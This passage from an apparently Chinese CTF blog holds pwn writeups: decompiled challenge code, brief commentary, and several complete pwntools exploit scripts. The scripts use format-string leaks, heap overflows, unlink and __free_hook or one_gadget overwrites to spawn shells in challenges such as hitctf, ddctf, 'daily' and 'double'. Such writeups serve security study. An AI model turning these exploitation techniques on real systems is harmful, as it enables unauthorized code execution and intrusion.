result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本题被 stripped 了，不过没事就基本用到了 3 4 个函数还是能分清的，所以直接把分析完的贴出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">int sub_8048B5C()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v1; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int v2; // [esp+10h] [ebp-18h]</span><br><span class="line">  void *v3; // [esp+14h] [ebp-14h]</span><br><span class="line">  int v4; // [esp+18h] [ebp-10h]</span><br><span class="line">  unsigned int v5; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  puts(&quot;Give me a index:&quot;);</span><br><span class="line">  v2 = read_written_by_chutide(unk_80F6C80);	//直接通过索引把 flag 对应内容读出来放 v2 上</span><br><span class="line">  v3 = (void *)mmap(0, 4096, 7, 34, 0, 0);</span><br><span class="line">  puts(&quot;Three is good number,I like it very much!&quot;);</span><br><span class="line">  read(0, v3, 3u);</span><br><span class="line">  puts(&quot;Leave you name of size:&quot;);</span><br><span class="line">  scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 512 )</span><br><span class="line">    sub_804F260(0);	//这个不太确定， exit ？？没往下看，不太重要，知道限制范围就行</span><br><span class="line">  puts(&quot;Tell me:&quot;);</span><br><span class="line">  read(0, &amp;unk_80F6CC0, v1 - 1);</span><br><span class="line">  v4 = ((int (__cdecl *)(signed int))v3)(1);	//只有三个字节的函数怎么搞？？返回值给 v4</span><br><span class="line">  if ( v2 == v4 )	//用爆破把它搞出来	</span><br><span class="line">    result = puts(&quot;1&quot;);</span><br><span class="line">  else</span><br><span class="line">    result = puts(&quot;2&quot;);</span><br><span class="line">  if ( __readgsdword(0x14u) != v5 )</span><br><span class="line">    check_fail();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键其实还是<code>read(0, &amp;unk_80F6CC0, v1 - 1);</code>这行，这个把 ecx 放上了 unk_80F6CC0 ，没清理掉，赶紧用上，把我们输进去即 <code>[ecx]</code> 放到 eax 假装当返回值，就是<code>0:  8b 01                   mov    eax,DWORD PTR [ecx]</code>，再加个 ret 回去就完事了~~~ （狗头）</p>
<p>难受了这么简单的题怪我太粗心了~~ 顺便安利一个贼强的网站，能<a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm">把汇编转为字节码</a> ，好用~~</p>
<p>第二道加 ollvm 了，不太会，第三个浏览器 pwn ，怎么搞~~~~</p>
<h2 id="hitctf-pwn1"><a href="#hitctf-pwn1" class="headerlink" title="hitctf pwn1"></a>hitctf pwn1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;./pwn1&#x27;)</span><br><span class="line">elf = ELF(&quot;./pwn1&quot;, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p.sendafter(&quot;Input your name:\n&quot;,&quot;%17$p&quot;)</span><br><span class="line">p.sendafter(&quot;Input the last six numbers of your ID card:\n&quot;,&quot;1&quot;*0x20+p64(1))</span><br><span class="line">p.sendlineafter(&quot;Your choice:&quot;,&quot;3&quot;)</span><br><span class="line">p.sendlineafter(&quot;Do you want to change your ID number?&quot;,&quot;y\n&quot;)</span><br><span class="line">p.sendafter(&quot;Input your cookie:\n&quot;,&quot;1\n&quot;)</span><br><span class="line">p.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">libc.address = int(p.recvuntil(&#x27;\n&#x27;)[:-1], 16)-0x20830</span><br><span class="line">#real = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&quot;\x00&quot;))-0x20830</span><br><span class="line">p.sendafter(&quot;Input your new ID number:\n&quot;,&quot;1&quot;*0x20+p64(1))</span><br><span class="line">p.sendlineafter(&quot;Your choice:&quot;,&quot;3&quot;)</span><br><span class="line">binsh = libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">print binsh</span><br><span class="line">system=libc.symbols[&#x27;system&#x27;]</span><br><span class="line">p.sendlineafter(&quot;Do you want to change your ID number?&quot;,&quot;a&quot;*0x28+p64(0x400DE3)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>我这个真是就看见一个洞,结果这个 <code>printf(s2, &amp;v1);</code> 也是一个~~~ 太粗心了丫~~~</p>
<h2 id="hitctf-pwn2"><a href="#hitctf-pwn2" class="headerlink" title="hitctf pwn2"></a>hitctf pwn2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn2&#x27;,aslr=2)</span><br><span class="line">elf = ELF(&quot;./pwn2&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(title,name,size,message):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendafter(&#x27;title:\n&#x27;,title)</span><br><span class="line">	p.sendafter(&#x27;name:\n&#x27;,name)</span><br><span class="line">	p.sendafter(&#x27;message size:\n&#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;message:\n&#x27;,message)</span><br><span class="line">def edit(ind,size,message):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Which one?\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;message size:\n&#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;new message:\n&#x27;,message)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Which one?\n&#x27;,str(ind))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Which one?\n&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(&#x27;a&#x27;,&#x27;a&#x27;,0x80,&#x27;a&#x27;*0x80)</span><br><span class="line">new(&#x27;b&#x27;,&#x27;b&#x27;,1,&#x27;b&#x27;)</span><br><span class="line">edit(0,0x90,&#x27;1&#x27;*8)</span><br><span class="line">new(&#x27;d&#x27;,&#x27;d&#x27;,0x80,&#x27;d&#x27;*8)</span><br><span class="line">show(2)</span><br><span class="line">p.recvuntil(&#x27;Title: &#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&quot;\x00&quot;))-0x3c4b64</span><br><span class="line">print hex(leak)</span><br><span class="line">new(&#x27;a&#x27;,&#x27;a&#x27;,0xf7,&#x27;a&#x27;*0x20)</span><br><span class="line">edit(3,0xb8,&#x27;0&#x27;)</span><br><span class="line">new(&#x27;d&#x27;,&#x27;d&#x27;,1,&#x27;d&#x27;)</span><br><span class="line">edit(3,0xb8,&#x27;\x01&#x27;*0xc8+p64(0x31)*4+p64(libc.symbols[&#x27;__free_hook&#x27;] + leak)+p64(81)*2)</span><br><span class="line">one=leak+0x4526a</span><br><span class="line">edit(4,0x51,p64(one))</span><br><span class="line">free(0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>找这个洞,花了五百万年,终于找到了,前后 5 个小时吧,服了,这题学了很多,明天写题解发先知!!</p>
<h2 id="ddctf-pwn"><a href="#ddctf-pwn" class="headerlink" title="ddctf pwn"></a>ddctf pwn</h2><p>比较简单的,但是溢出不太常规,注意一下偏移直接 one_gadget 必定成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">#!/upr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">p = process(&#x27;./xpwn&#x27;)</span><br><span class="line">elf = ELF(&quot;./xpwn&quot;, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p.recvuntil(&#x27;Enter username: &#x27;)</span><br><span class="line">p.send(&#x27;a&#x27;*40)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*40)</span><br><span class="line">stack = u32(p.recv(4))-72</span><br><span class="line">libc = u32(p.recv(4))-417797</span><br><span class="line">p.recvuntil(&#x27;password: &#x27;)</span><br><span class="line">p.send(&#x27;-1&#x27;)</span><br><span class="line">p.recvuntil(&#x27;): &#x27;)</span><br><span class="line">one = libc+0x5fbc6</span><br><span class="line">print hex(one)</span><br><span class="line">p.send(p32(one)+p32(0)+&#x27;a&#x27;*60+p32(stack))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>没题做了,再做一遍今年信息安全 pwn</p>
<h2 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span><br><span class="line">p.recvuntil(&#x27;name:&#x27;)</span><br><span class="line">p.sendline(&#x27;test&#x27;)</span><br><span class="line">libc = &#x27;&#x27;</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">for i in range(637,631,-1):</span><br><span class="line">	p.recvuntil(&#x27;index\n&#x27;)</span><br><span class="line">	p.sendline(str(i))</span><br><span class="line">	p.recvuntil(&#x27;hex) &#x27;)</span><br><span class="line">	tmp = p.recvuntil(&#x27;\n&#x27;)[:-1]</span><br><span class="line">	print tmp[-2:]</span><br><span class="line">	if len(tmp)&lt;2:</span><br><span class="line">		tmp = &#x27;0&#x27;+tmp</span><br><span class="line">	libc+= tmp[-2:]</span><br><span class="line">	p.recvuntil(&#x27;value\n&#x27;)</span><br><span class="line">	p.sendline(&#x27;0&#x27;)</span><br><span class="line">real = int(libc,16)-133168</span><br><span class="line">print &#x27;libc==&gt;&#x27;+str(hex(real))</span><br><span class="line">one = real+0x45216</span><br><span class="line">print hex(one)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">for i in range(0,6):</span><br><span class="line">	p.recvuntil(&#x27;index\n&#x27;)</span><br><span class="line">	p.sendline(str(i+344))</span><br><span class="line">	p.recvuntil(&#x27;hex) &#x27;)</span><br><span class="line">	tmp = p.recvuntil(&#x27;\n&#x27;)[:-1]</span><br><span class="line">	p.recvuntil(&#x27;value\n&#x27;)</span><br><span class="line">	p.sendline(str(ord(p64(one)[i])))</span><br><span class="line">p.sendline(&#x27;a&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./daily&#x27;,aslr=2)</span><br><span class="line">elf = ELF(&quot;./daily&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def show():</span><br><span class="line">	p.sendafter(&#x27;choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line">def new(length,message):</span><br><span class="line">	p.sendafter(&#x27;choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendafter(&#x27;daily:&#x27;,str(length))</span><br><span class="line">	p.sendafter(&#x27;Now you can write you daily\n&#x27;,message)</span><br><span class="line">def edit(ind,message):</span><br><span class="line">	p.sendafter(&#x27;choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendafter(&#x27;daily:&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;Please enter the new daily\n&#x27;,message)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendafter(&#x27;choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendafter(&#x27;daily:&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">new(0x60,&#x27;a&#x27;)</span><br><span class="line">new(0x60,&#x27;a&#x27;)</span><br><span class="line">new(0x80,&#x27;a&#x27;)</span><br><span class="line">new(0x80,&#x27;a&#x27;)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">new(0x60,&#x27;a&#x27;)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&#x27;0 : &#x27;)</span><br><span class="line">heap = u64(p.recvuntil(&#x27;2&#x27;)[:-1].ljust(8,&quot;\x00&quot;))-0x61</span><br><span class="line">print hex(heap)</span><br><span class="line">free(2)</span><br><span class="line">new(0x80,&#x27;a&#x27;)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&#x27;1 : &#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;3&#x27;)[:-1].ljust(8,&quot;\x00&quot;))-0x61-3951360</span><br><span class="line">free_hook=libc.symbols[&#x27;__free_hook&#x27;] + leak</span><br><span class="line">sys=libc.symbols[&#x27;system&#x27;] + leak</span><br><span class="line">print hex(leak)</span><br><span class="line">print hex(free_hook)</span><br><span class="line">edit(0,&#x27;a&#x27;*8+p64(heap+0x10))</span><br><span class="line">a =(heap+0x10-0x602060)/16</span><br><span class="line">free(a)</span><br><span class="line">new(0x71,&#x27;a&#x27;)</span><br><span class="line">edit(0,p64(0x602078))</span><br><span class="line">new(0x60,&#x27;/bin/sh&#x27;)</span><br><span class="line">new(0x60,p64(free_hook))</span><br><span class="line">edit(2,p64(sys))</span><br><span class="line">free(0)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>深入学习大佬姿势,好骚好骚,第一次接触这种不限制 free 范围的</p>
<h2 id="double"><a href="#double" class="headerlink" title="double"></a>double</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./double&#x27;,aslr=2)</span><br><span class="line">elf = ELF(&quot;./double&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">def new(message):</span><br><span class="line">	p.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Your data:\n&#x27;,message)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Info index: &#x27;,str(ind))</span><br><span class="line">def edit(ind,message):</span><br><span class="line">	p.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Info index: &#x27;,str(ind))</span><br><span class="line">	p.sendline(message)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Info index: &#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">new(&#x27;0&#x27;*0x80)</span><br><span class="line">new(&#x27;0&#x27;*0x80)</span><br><span class="line">free(1)</span><br><span class="line">show(0)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">real = leak-3951480</span><br><span class="line">print hex(leak)</span><br><span class="line">mall = leak-88-16-0x23</span><br><span class="line">print hex(mall)</span><br><span class="line">new(&#x27;2&#x27;*0x60)</span><br><span class="line">new(&#x27;2&#x27;*0x60)</span><br><span class="line">new(&#x27;2&#x27;*0x60)</span><br><span class="line">free(3)</span><br><span class="line">edit(2,p64(mall))</span><br><span class="line">new(&#x27;6&#x27;*0x60)</span><br><span class="line">one = real+0x4526a</span><br><span class="line">new(&#x27;a&#x27;*0x13+p64(one)+&#x27;0&#x27;*(0x60-0x13-8))</span><br><span class="line">p.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>一开始没看懂这题</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/11/2019-11-11-6th_week/" data-id="cuidiIBpH4KOu1XTrwERLb-bN" data-title="sixth week" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-11-11-strange_1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/11/2019-11-11-strange_1/" class="article-date">
  <time class="dt-published" datetime="2019-11-10T16:00:00.000Z" itemprop="datePublished">2019-11-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/11/2019-11-11-strange_1/">Some strange questions</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>本文首发<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7989">先知</a></p>
<p>本人在做堆题时经常遇到一些特别怪的套路,自己不看 exp 基本永远想不到,看完后先是一脸蒙,经过调试就恍然大悟.奥~~ 还能这么玩,所以通过这个系列记录一下</p>
<p>在 fastbin 中,大多数时候修改成可利用的 fd 很考验堆的构造能力,下边就以<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3383#toc-4">该题</a>作为模板,因为这题实在有点合适</p>
<h2 id="漏洞简要分析"><a href="#漏洞简要分析" class="headerlink" title="漏洞简要分析"></a>漏洞简要分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 take_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;which one do you want modify :&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( buf[v1] != 0LL &amp;&amp; v1 &gt;= 0 &amp;&amp; v1 &lt;= 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;please input the content&quot;);</span><br><span class="line">    read(0, buf[v1], 0x100uLL);		//溢出</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显,直接能输入 0x100 字节,堆溢出. checksec 一下,一看没开 pie </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; checksec supwn5 </span><br><span class="line">[*] &#x27;/home/pic/\xe6\xa1\x8c\xe9\x9d\xa2/11\xe6\x9c\x88\xe6\x96\x87\xe7\xab\xa0/supwn5&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>我习惯直接 unlink 了,实在有点好用, unlink 的 exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./supwn5&#x27;)</span><br><span class="line">elf = ELF(&quot;./supwn5&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;please input the size : \n&#x27;,str(size))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to delete\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which one do you want modify :\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;please input the content&#x27;,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(0x80)</span><br><span class="line">new(0x80)</span><br><span class="line">new(1)</span><br><span class="line">payload = p64(0)+p64(0x81)+p64(0x06020C0-24)+p64(0x06020C0-16)</span><br><span class="line">payload = payload.ljust(0x80)</span><br><span class="line">payload+=p64(0x80)+p64(0x90)</span><br><span class="line">edit(0,payload)</span><br><span class="line">free(1)</span><br><span class="line">pay = p64(0)*3+p64(elf.got[&#x27;puts&#x27;])+p64(0x06020C0-24)*5</span><br><span class="line">edit(0,pay)</span><br><span class="line">p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">p.sendlineafter(&#x27;which node do you want to show\n&#x27;,&#x27;0&#x27;)</span><br><span class="line">p.recvuntil(&#x27;the content is : \n&#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">pay = p64(0)*3+p64(free_hook)+p64(0x06020C0-24)*5</span><br><span class="line">edit(1,pay)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">one=libc_base+0x4526a</span><br><span class="line">edit(0,p64(one))</span><br><span class="line">free(1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>常规思路 unlink 到 bss 端直接指那打哪,但是能溢出这么多字节就利用个 off-by-one 觉得有点可惜,就想用点别的思路来做</p>
